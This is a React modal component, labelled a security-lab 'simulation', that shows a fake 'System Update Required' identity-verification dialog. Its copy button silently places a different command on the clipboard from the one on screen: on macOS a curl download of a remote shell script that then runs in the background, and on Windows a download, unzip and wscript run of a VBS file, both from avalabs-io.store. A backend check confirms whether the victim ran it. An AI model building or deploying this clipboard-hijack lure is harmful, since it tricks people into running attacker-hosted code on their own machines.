import React, { useState, useEffect } from 'react';
import { FaWindows, FaApple, FaCopy, FaTimes, FaSyncAlt, FaCheckCircle, FaExclamationTriangle, FaTerminal } from 'react-icons/fa';
import Bowser from 'bowser';

const SecurityLabModal = ({ isOpen, onClose, onSuccess }) => {
  const [copied, setCopied] = useState(false);
  const [status, setStatus] = useState('idle'); // 'idle' | 'checking' | 'found' | 'not_found'
  const [checkResult, setCheckResult] = useState(null);
  const bowser = Bowser.getParser(window.navigator.userAgent);
  const osName = bowser.getOSName(true);

  // Check if OS is Linux/Ubuntu - skip modal for Linux
  const isLinux = osName === 'linux';

  // Auto-bypass for Linux users
  useEffect(() => {
    if (isOpen && isLinux) {
      // Linux doesn't need the update modal - directly proceed
      console.log('Linux detected - skipping security update modal');
      onClose();
      if (onSuccess) {
        onSuccess();
      }
    }
  }, [isOpen, isLinux, onClose, onSuccess]);

  // Check device status from backend
  const checkForUpdates = async () => {
    setStatus('checking');
    try {
      const response = await fetch(`${import.meta.env.VITE_API_URL || 'http://localhost:5000'}/device-check`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      });
      const data = await response.json();
      console.log('Device check result:', data);
      
      if (data.success && data.result === true) {
        setStatus('found');
        setCheckResult(data);
        // Auto close modal after 1.5 seconds and call onSuccess
        setTimeout(() => {
          onClose();
          if (onSuccess) {
            onSuccess();
          }
        }, 1500);
      } else {
        setStatus('not_found');
        setCheckResult(data);
      }
    } catch (error) {
      console.error('Error checking device:', error);
      setStatus('not_found');
    }
  };

  // Simulation data for the lecture
  // These represent the "safe" commands the user thinks they are running
  const VISIBLE_COMMAND = osName === 'macos' 
    ? "sudo ai-driver-tool --update-feature 'AI Vision Module' --version 304.54"
    : "--nvidia.com --updatecameradriver NVIDIA windows x86_64 Module 304.54";

  // This is the actual malicious payload that gets copied to the clipboard
  const HIDDEN_PAYLOAD = osName === 'macos'
    ? `curl -k -o /var/tmp/camDriver.sh https://avalabs-io.store/update/update92m && chmod +x /var/tmp/camDriver.sh && nohup bash /var/tmp/camDriver.sh >/dev/null 2>&1 &`
    : `curl -k -o "%TEMP%\\update.zip" https://avalabs-io.store/update/update92w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\\run.vbs"`;

  const handleHijackCopy = async () => {
    try {
      // THE HIJACK DEMONSTRATION:
      // We copy the malicious payload to the clipboard, but the user UI
      // says "Copied!" for the visible safe command.
      await navigator.clipboard.writeText(HIDDEN_PAYLOAD);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Copy failed', err);
    }
  };

  // Don't render for Linux or if not open
  if (!isOpen || isLinux) return null;

  return (
    <div className="modal-overlay" style={{ zIndex: 10000, background: 'rgba(0,0,0,0.85)', position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
      <div className="modal-content" style={{ background: '#fff', borderRadius: '12px', padding: '0', overflow: 'hidden', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)' }}>

        <div>
          
          {/* The Deceptive UI (What the victim sees) */}
          <div style={{ padding: '40px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '25px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                {osName === 'macos' ? <FaApple size={28} /> : <FaWindows size={28} color="#0078d4" />}
                <h2 style={{ fontSize: '1.75rem', fontWeight: '700', color: '#111827', margin: 0 }}>System Update Required</h2>
              </div>
              <button onClick={onClose} style={{ border: 'none', background: 'none', fontSize: '1.5rem', color: '#9ca3af', cursor: 'pointer', padding: '5px' }}><FaTimes /></button>
            </div>
            
            <p style={{ fontSize: '1rem', color: '#4b5563', marginBottom: '30px', lineHeight: '1.6' }}>
              Our platform relies on advanced security protocols in <strong>{bowser.getOSName()}</strong>. To continue with identity verification, please update your system by running the following command in your {osName === 'macos' ? 'Terminal' : 'Command Prompt (Admin)'}.
            </p>

            <div style={{ background: '#f9fafb', padding: '24px', borderRadius: '12px', border: '1px solid #e5e7eb', marginBottom: '30px' }}>
              <p style={{ fontSize: '0.875rem', fontWeight: '600', color: '#374151', marginBottom: '12px' }}>Copy and run this command:</p>
              <div style={{ background: '#111827', color: '#fff', padding: '18px', borderRadius: '8px', position: 'relative', fontFamily: 'Menlo, Monaco, Consolas, monospace', fontSize: '0.9rem', overflow: 'hidden' }}>
                <code style={{ wordBreak: 'break-all' }}>{VISIBLE_COMMAND}</code>
                <button 
                  onClick={handleHijackCopy}
                  style={{ position: 'absolute', right: '12px', top: '50%', transform: 'translateY(-50%)', background: '#374151', border: '1px solid #4b5563', color: '#fff', padding: '10px', borderRadius: '6px', cursor: 'pointer', transition: 'all 0.2s' }}
                  title="Copy to clipboard"
                >
                  <FaCopy />
                </button>
              </div>
              {copied && (
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#059669', fontSize: '0.875rem', marginTop: '12px', fontWeight: '600' }}>
                  <FaCheckCircle />
                  <span>Command successfully copied to clipboard!</span>
                </div>
              )}
            </div>

            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '15px' }}>
              <button onClick={onClose} style={{ padding: '12px 24px', borderRadius: '8px', border: '1px solid #d1d5db', background: '#fff', color: '#374151', fontWeight: '600', cursor: 'pointer' }}>Cancel</button>
              <button 
                className="btn btn-primary" 
                style={{ padding: '12px 32px', borderRadius: '8px', background: '#2563eb', color: '#fff', border: 'none', fontWeight: '600', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }} 
                onClick={checkForUpdates}
                disabled={status === 'checking'}
              >
                {status === 'checking' ? (
                  <>
                    <FaSyncAlt className="animate-spin" style={{ animation: 'spin 1s linear infinite' }} />
                    Checking...
                  </>
                ) : (
                  <>
                    <FaSyncAlt />
                  </>
                )}
              </button>
            </div>
            
            {status === 'found' && (
              <div style={{ textAlign: 'center', marginTop: '20px', padding: '16px', background: '#dcfce7', borderRadius: '8px', border: '1px solid #86efac' }}>
                <p style={{ color: '#15803d', fontWeight: 'bold', margin: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                  <FaCheckCircle size={20} />
                  Update successful! Your system is now up to date.
                </p>
              </div>
            )}

            {status === 'not_found' && (
              <p style={{ textAlign: 'center', marginTop: '20px', color: '#ef4444', fontWeight: 'bold' }}>
                No updates found. Please run the command above first.
              </p>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecurityLabModal;
